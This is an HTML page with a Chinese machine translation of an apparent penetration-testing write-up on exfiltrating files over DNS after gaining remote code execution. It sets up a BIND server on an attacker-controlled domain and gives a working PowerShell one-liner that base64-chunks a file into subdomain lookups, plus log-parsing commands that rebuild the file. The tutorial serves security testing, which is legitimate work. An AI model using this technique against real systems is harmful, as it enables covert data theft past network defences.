<html>
<head>
<title>Data exfiltration over DNS with Remote Code Execution</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过远程代码执行在DNS上进行数据渗透</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/data-exfiltration-over-dns-with-remote-code-execution-22c2b228e373?source=collection_archive---------0-----------------------#2020-03-31">https://infosecwriteups.com/data-exfiltration-over-dns-with-remote-code-execution-22c2b228e373?source=collection_archive---------0-----------------------#2020-03-31</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/e9346f8eec98bfc9386f28055b752ae3.png" data-original-src="https://miro.medium.com/v2/resize:fit:872/format:webp/1*VnIcE7YjeiefyPLsyWaL2Q.png"/></div></figure><p id="d5e2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">一段时间以前，我遇到了一个问题，我需要通过DNS来过滤数据，因为所有其他选项都被阻止了。关于这一点的一个重要注意事项是，你应该彻底阅读测试描述，以验证这是否是允许的，因为在某些情况下，这可能会给你带来麻烦。这绝不是一个理想的解决方案，在未来我计划实现我自己的DNS监听器，但是因为我已经运行了一个绑定DNS服务器，这就是我在这个时间点上是如何做的。</p><p id="28c8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">另一种泄漏数据的方法也是使用dnscat2这样的工具，但是您需要修改有效负载和通信模式，因为它在云环境中很容易被检测到。</p><p id="7046" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">Burp Collaborator对于小数据也有很大帮助，但是如果你需要提取较大的文件，可能会有点麻烦。</p><div class="ks kt gp gr ku kv"><a href="https://github.com/iagox86/dnscat2" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab fo"><div class="kx ab ky cl cj kz"><h2 class="bd ir gy z fp la fr fs lb fu fw ip bi translated">iagox86/dnscat2</h2><div class="lc l"><h3 class="bd b gy z fp la fr fs lb fu fw dk translated">注意:的密码。zip下载都是“密码”！*****欢迎来到dnscat2，这是一个不会…</h3></div><div class="ld l"><p class="bd b dl z fp la fr fs lb fu fw dk translated">github.com</p></div></div><div class="le l"><div class="lf l lg lh li le lj js kv"/></div></div></a></div><h2 id="b9cb" class="lk ll iq bd lm ln lo dn lp lq lr dp ls kf lt lu lv kj lw lx ly kn lz ma mb mc bi translated">入门指南</h2><p id="d73f" class="pw-post-body-paragraph ju jv iq jw b jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn mh kp kq kr ij bi translated">要开始，您需要一些先决条件:</p><ol class=""><li id="7a87" class="mi mj iq jw b jx jy kb kc kf mk kj ml kn mm kr mn mo mp mq bi translated">像testdomain.com一样属于你的领域。你可以从像GoDaddy这样的网站上得到这个。</li><li id="d540" class="mi mj iq jw b jx mr kb ms kf mt kj mu kn mv kr mn mo mp mq bi translated">一个带有公共IP地址的Linux VPS(虚拟专用服务器)(你可以每月花大约5美元得到一个)来运行你的带有BIND的DNS名称服务器</li><li id="568a" class="mi mj iq jw b jx mr kb ms kf mt kj mu kn mv kr mn mo mp mq bi translated">远程代码执行漏洞</li></ol><h2 id="b802" class="lk ll iq bd lm ln lo dn lp lq lr dp ls kf lt lu lv kj lw lx ly kn lz ma mb mc bi translated">设置</h2><ol class=""><li id="55cc" class="mi mj iq jw b jx md kb me kf mw kj mx kn my kr mn mo mp mq bi translated">将您的DNS名称服务器位置指向GoDaddy上的VPS IP地址</li><li id="90c3" class="mi mj iq jw b jx mr kb ms kf mt kj mu kn mv kr mn mo mp mq bi translated">安装并配置BIND以解析您的域</li></ol><div class="ks kt gp gr ku kv"><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-bind-as-a-private-network-dns-server-on-ubuntu-18-04" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab fo"><div class="kx ab ky cl cj kz"><h2 class="bd ir gy z fp la fr fs lb fu fw ip bi translated">如何在Ubuntu 18.04 | DigitalOcean上将BIND配置为私有网络DNS服务器</h2><div class="lc l"><h3 class="bd b gy z fp la fr fs lb fu fw dk translated">管理服务器配置和基础架构的一个重要部分包括维护一种简单的查找方式…</h3></div><div class="ld l"><p class="bd b dl z fp la fr fs lb fu fw dk translated">www.digitalocean.com</p></div></div><div class="le l"><div class="mz l lg lh li le lj js kv"/></div></div></a></div><p id="882d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">3.可选您可以将DNS查询日志保存到一个单独的文件中，以便于使用示例:/var/log/bind/queries.log</p><div class="ks kt gp gr ku kv"><a href="https://ixnfo.com/en/configuring-bind9-logs.html" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab fo"><div class="kx ab ky cl cj kz"><h2 class="bd ir gy z fp la fr fs lb fu fw ip bi translated">配置Bind9日志</h2><div class="lc l"><h3 class="bd b gy z fp la fr fs lb fu fw dk translated">默认情况下，Bind9日志被写入系统日志/ var / log / syslog，为了将它们分开，我将执行…</h3></div><div class="ld l"><p class="bd b dl z fp la fr fs lb fu fw dk translated">ixnfo.com</p></div></div><div class="le l"><div class="na l lg lh li le lj js kv"/></div></div></a></div><h2 id="291b" class="lk ll iq bd lm ln lo dn lp lq lr dp ls kf lt lu lv kj lw lx ly kn lz ma mb mc bi translated">漏出</h2><p id="4c94" class="pw-post-body-paragraph ju jv iq jw b jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn mh kp kq kr ij bi translated">为了过滤数据，您需要将值分成48个块，然后Base64编码，并将每个值作为查询发送到您的域。</p><ul class=""><li id="5512" class="mi mj iq jw b jx jy kb kc kf mk kj ml kn mm kr nb mo mp mq bi translated">AAAA…A.yourdomain.com</li><li id="546a" class="mi mj iq jw b jx mr kb ms kf mt kj mu kn mv kr nb mo mp mq bi translated">BBBB…B.yourdomain.com</li></ul><pre class="nc nd ne nf gt ng nh ni nj aw nk bi"><span id="d2c7" class="lk ll iq nh b gy nl nm l nn no">powershell -ex bypass -noprofile -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('.\index.html')) -split '(\w{48})' | foreach{$value = $_ + '.yourdomain.com'; ping -n 1 $value}"</span></pre><h2 id="37ee" class="lk ll iq bd lm ln lo dn lp lq lr dp ls kf lt lu lv kj lw lx ly kn lz ma mb mc bi translated">读取数据</h2><p id="87b2" class="pw-post-body-paragraph ju jv iq jw b jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn mh kp kq kr ij bi translated">在接收端，你需要理解数据</p><p id="7d32" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用这个命令，您可以从绑定查询中提取数据，并将其输入到文件中</p><pre class="nc nd ne nf gt ng nh ni nj aw nk bi"><span id="fbee" class="lk ll iq nh b gy nl nm l nn no">cat /var/log/bind/queries.log | grep .yourdomain.com | cut -d " " -f5 | sed 's/(//' | sed 's/)//' | sed 's/://' | sed 's/\.yourdomain\.com//' &gt; file</span></pre><p id="8b79" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在读取base64块之后，您实际上需要将它们转换回正常的可读格式，并将它们组合成最终的文件</p><pre class="nc nd ne nf gt ng nh ni nj aw nk bi"><span id="7743" class="lk ll iq nh b gy nl nm l nn no">while IFS= read -r line; do echo "$line" | base64 --decode; done &lt; file &gt;&gt; final_result</span></pre><h2 id="bf4b" class="lk ll iq bd lm ln lo dn lp lq lr dp ls kf lt lu lv kj lw lx ly kn lz ma mb mc bi translated">问题</h2><p id="187d" class="pw-post-body-paragraph ju jv iq jw b jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn mh kp kq kr ij bi translated">像这样读取数据有时会非常棘手，因为一些数据块可能会丢失或混淆，所以要保持警惕。解决这个问题的一个方法是在每个块上实现一个索引。</p></div><div class="ab cl np nq hu nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="ij ik il im in"><p id="1902" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="nw">关注</em> <a class="ae nx" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nw"> Infosec报道</em> </a> <em class="nw">获取更多此类精彩报道。</em></p><div class="ks kt gp gr ku kv"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="kw ab fo"><div class="kx ab ky cl cj kz"><h2 class="bd ir gy z fp la fr fs lb fu fw ip bi translated">信息安全报道</h2><div class="lc l"><h3 class="bd b gy z fp la fr fs lb fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ld l"><p class="bd b dl z fp la fr fs lb fu fw dk translated">medium.com</p></div></div><div class="le l"><div class="ny l lg lh li le lj js kv"/></div></div></a></div></div></div>    
</body>
</html>